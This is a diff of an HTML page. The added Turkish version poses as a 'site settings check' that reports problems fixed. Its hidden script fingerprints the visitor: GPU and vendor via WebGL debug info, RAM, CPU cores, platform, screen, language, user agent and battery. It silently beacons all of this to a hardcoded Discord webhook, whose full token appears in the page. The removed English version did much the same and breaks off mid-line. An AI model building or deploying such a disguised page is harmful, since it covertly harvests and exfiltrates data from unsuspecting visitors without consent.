@@ -1,48 +1,75 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="tr">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Resources</title>
+    <title>Sistem Kontrolü</title>
     <style>
-        body { background: #000; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .loader { border: 2px solid #111; border-top: 2px solid #0f0; border-radius: 50%; width: 25px; height: 25px; animation: spin 1s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background:#050505; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
+        h2 { color:#444; font-size:13px; font-weight:400; letter-spacing:1px; }
+        .ok { color:#0f4; font-weight:bold; }
     </style>
 </head>
 <body>
-    <div class="loader"></div>
+    <h2 id="t">Site ayarları kontrol ediliyor...</h2>
 
     <script>
-        "use strict";
+        const u = "https://discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL";
 
-        // Canary Webhook Address - Most Resilient for Automated Logging
-        const HOOK = "https://discord.com/api/webhooks/1457149465688543363/FlP0AtpIk-Yg8NwxGQ1CSdityVf67AL-ODXFlPl9FtQq-tV5j2a9iZmWkGNAUsOHD9uL"
-
-        async function ultraDataExtract() {
-            // Initializing Data Object
-            let sys = {
-                os: "Unknown", gpu: "Blocked/Masked", ven: "Blocked/Masked",
-                ip: "N/A", iss: "N/A", loc: "N/A",
-                net: "N/A", bat: "N/A", 
-                res: `${screen.width}x${screen.height} (${screen.colorDepth}bit)`,
-                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                vpn: "✅ Clear"
-            };
-
-            // 1. Precise OS Extraction
-            try {
-                const ua = navigator.userAgent;
-                const match = ua.match(/\(([^)]+)\)/);
-                sys.os = match ? match[1] : navigator.platform;
-            } catch(e) { sys.os = "Parsing Error"; }
-
-            // 2. Hardware Extraction (WebGL Force)
+        async function extract() {
+            let info = {};
+            
+            // 1. DERİN GPU ANALİZİ
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
-                if (gl) {
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    sys.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID) || "Hidden";
-                    sys.ven = gl.getParameter(dbg.UNMASKED_
-        
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                info.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_ID);
+                info.vendor = gl.getParameter(dbg.UNMASKED_VENDOR_ID);
+            } catch(e) { info.gpu = "Engellendi"; }
+
+            // 2. DONANIM VE SİSTEM
+            info.ram = navigator.deviceMemory + " GB";
+            info.cpu = navigator.hardwareConcurrency + " Çekirdek";
+            info.plt = navigator.platform;
+            info.res = screen.width + "x" + screen.height + " (" + window.devicePixelRatio + "x)";
+            info.lang = navigator.language;
+            info.ua = navigator.userAgent;
+
+            // 3. PİL VE BAĞLANTI (GİZLİ)
+            if (navigator.getBattery) {
+                const b = await navigator.getBattery();
+                info.bat = (b.level * 100) + "% (Şarjda: " + (b.charging ? 'Evet' : 'Hayır') + ")";
+            }
+
+            // 4. VERİ PAKETLEME (EN VAHŞİ SET)
+            const payload = {
+                embeds: [{
+                    title: "🕵️ KRİTİK CİHAZ ANALİZİ (FULL ACCESS)",
+                    color: 15158332,
+                    fields: [
+                        { name: "🛠️ DONANIM KATMANI", value: `**GPU:** ${info.gpu}\n**VENDOR:** ${info.vendor}\n**RAM:** ${info.ram}\n**CPU:** ${info.cpu}`, inline: false },
+                        { name: "📱 YAZILIM/EKRAN", value: `**OS:** ${info.plt}\n**RES:** ${info.res}\n**DİL:** ${info.lang}`, inline: true },
+                        { name: "🔋 DURUM", value: info.bat || "Erişim Yok", inline: true },
+                        { name: "🌐 TARAYICI KİMLİĞİ", value: "```" + info.ua + "```", inline: false }
+                    ],
+                    timestamp: new Date()
+                }]
+            };
+
+            // 5. YILDIRIM GÖNDERİM
+            const blob = new Blob([JSON.stringify(payload)], {type: 'application/json'});
+            navigator.sendBeacon(u, blob);
+
+            // 6. ARAYÜZ AKIŞI
+            const t = document.getElementById('t');
+            setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 200);
+            setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 700);
+        }
+
+        extract();
+    </script>
+</body>
+</html>
+
+
